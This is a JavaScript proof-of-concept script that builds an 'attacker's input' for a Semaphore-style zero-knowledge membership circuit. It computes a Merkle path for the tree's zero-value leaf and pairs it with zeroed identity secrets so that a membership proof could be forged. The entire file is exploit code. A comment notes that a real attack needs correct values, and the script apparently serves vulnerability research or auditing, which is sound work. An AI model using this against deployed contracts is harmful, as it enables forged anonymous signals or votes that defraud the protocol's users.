const circomlibjs = require("circomlibjs");
const { BigNumber } = require("@ethersproject/bignumber");
const { BytesLike, Hexable, zeroPad, hexlify } = require("@ethersproject/bytes");
const { keccak256 } = require("@ethersproject/keccak256");

// Replicating the hash function from hash.ts
function hash(message) {
    if (typeof message === 'string') {
        message = Buffer.from(message, 'utf8');
    } else if (typeof message === 'number' || typeof message === 'bigint') {
        message = BigNumber.from(message).toHexString();
    }
    message = hexlify(zeroPad(message, 32));
    return BigInt(keccak256(message)) >> BigInt(8);
}

async function main() {
    // Initialize poseidon
    const poseidon = await circomlibjs.buildPoseidon();

    // Function to calculate identity commitment (leaf value)
    function calculateIdentityCommitment(secret) {
        return poseidon.F.toObject(poseidon([secret]));
    }

    // Function to generate Merkle tree path for zeroValue
    function generateZeroValuePath(depth) {
        const zeroValue = 0n;
        const path = [];
        let currentHash = calculateIdentityCommitment(zeroValue);

        for (let i = 0; i < depth; i++) {
            path.push({
                pathIndex: 0,
                sibling: currentHash
            });
            currentHash = poseidon.F.toObject(poseidon([currentHash, currentHash]));
        }

        return {
            root: currentHash,
            path: path
        };
    }

    // Generate attacker's input
    function generateAttackerInput(depth = 20) {
        const zeroValue = 0n;
        const externalNullifier = 1n; // Example external nullifier
        const signal = "Attacker's signal";

        const { root, path } = generateZeroValuePath(depth);

        // In real-world attack, identityNullifier and identityTrapdoor should be correct values
        // corresponding to "zeroValue" membership in the incremental merkle tree
        // Here we just use 0 to represent them. The actual checks are in the solidity contracts
        return {
            identityNullifier: zeroValue,
            identityTrapdoor: zeroValue,
            treePathIndices: path.map(p => p.pathIndex),
            treeSiblings: path.map(p => p.sibling),
            signalHash: hash(signal),
            externalNullifier: hash(externalNullifier),
        };
    }

    // Generate and log the attacker's input
    const attackerInput = generateAttackerInput();
    console.log(JSON.stringify(attackerInput, (_, v) => typeof v === 'bigint' ? v.toString() : v, 2));
}

main().catch(console.error);
